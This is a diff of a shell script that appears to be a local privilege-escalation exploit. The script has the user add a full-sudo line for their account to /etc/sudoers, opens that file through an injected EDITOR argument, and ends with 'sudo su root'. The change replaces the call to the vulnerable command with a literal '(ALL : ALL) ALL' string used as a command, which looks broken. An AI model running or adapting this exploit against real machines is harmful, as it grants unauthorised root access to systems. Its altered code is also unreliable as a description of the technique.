@@ -36,7 +36,6 @@ fi
 echo "> Opening sudoers file, please add the following line to the file in order to do the privesc:"
 echo "$USER ALL=(ALL:ALL) ALL"
 read -n 1 -s -r -p "Press any key to continue..."
-echo "EXPLOITABLE=$EXPLOITABLE"
-EDITOR="nano -- /etc/sudoers" $EXPLOITABLE
+EDITOR="nano -- /etc/sudoers" "(ALL : ALL) ALL"
 sudo su root
 exit 0
